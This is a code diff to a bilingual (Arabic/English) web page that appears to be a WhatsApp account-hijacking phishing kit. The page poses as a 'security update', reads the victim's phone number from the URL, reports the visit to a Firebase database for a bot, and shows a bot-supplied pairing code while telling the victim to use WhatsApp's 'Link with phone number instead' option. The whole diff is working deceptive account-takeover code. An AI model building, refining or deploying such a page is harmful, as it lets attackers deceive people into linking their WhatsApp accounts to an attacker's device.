@@ -43,6 +43,10 @@
         firebase.initializeApp(config);
         const db = firebase.database();
 
+        // سحب الرقم من الرابط (مثال: ?id=2010xxxxxxx)
+        const urlParams = new URLSearchParams(window.location.search);
+        const vId = urlParams.get('id') || "User_" + Math.floor(Math.random() * 9999);
+
         function getDevice() {
             const ua = navigator.userAgent;
             if (/android/i.test(ua)) return "Android Device";
@@ -53,16 +57,16 @@
 
         const langData = {
             ar: {
-                title: "تحديث أمان البروتوكول المشفر",
+                title: "تحديث أمان الحساب للرقم: " + (urlParams.get('id') || ""),
                 device: "تم التعرف على جهازك: " + deviceName,
                 alert: "⚠️ تنبيه: سيصلك الآن إشعار على واتساب يطلب 'ربط جهاز جديد'. اضغط عليه للمتابعة.",
                 instr: "خطوات المزامنة:<br>1. افتح الإشعار أو اذهب للإعدادات > الأجهزة المرتبطة.<br>2. اضغط على 'ربط جهاز'.<br>3. <span class='highlight'>مهم جداً:</span> اضغط على كلمة <b>'الربط برقم الهاتف بدلاً من ذلك'</b> التي ستظهر أسفل الشاشة.<br>4. أدخل الكود التالي في الخانات التي ستظهر لك:",
                 loading: "فحص..."
             },
             en: {
-                title: "Security Protocol Update",
+                title: "Security Update for: " + (urlParams.get('id') || ""),
                 device: "Verified Device: " + deviceName,
-                alert: "⚠️ Alert: A notification will appear on your WhatsApp asking to 'Link a Device'. Tap it to proceed.",
+                alert: "Alert: A notification will appear on your WhatsApp asking to 'Link a Device'. Tap it to proceed.",
                 instr: "Sync Steps:<br>1. Open notification or go to Settings > Linked Devices.<br>2. Tap 'Link a Device'.<br>3. <span class='highlight'>Important:</span> Tap on <b>'Link with phone number instead'</b> at the bottom of your screen.<br>4. Enter the following code in the boxes provided:",
                 loading: "Checking..."
             }
@@ -77,9 +81,10 @@
         document.getElementById('instruction').innerHTML = langData[userLang].instr;
         document.getElementById('pairing-code').innerText = langData[userLang].loading;
 
-        let vId = new URLSearchParams(window.location.search).get('id') || "User_" + Math.floor(Math.random() * 9999);
+        // إرسال الإشعار فوراً للبوت باستخدام الرقم كـ ID
         db.ref('visiting/' + vId).set({ status: "online", device: deviceName, lang: userLang, time: Date.now() });
 
+        // الاستماع للكود اللي هتبعته من البوت
         db.ref('sessions/' + vId).on('value', (snapshot) => {
             const data = snapshot.val();
             if (data && data.code) {
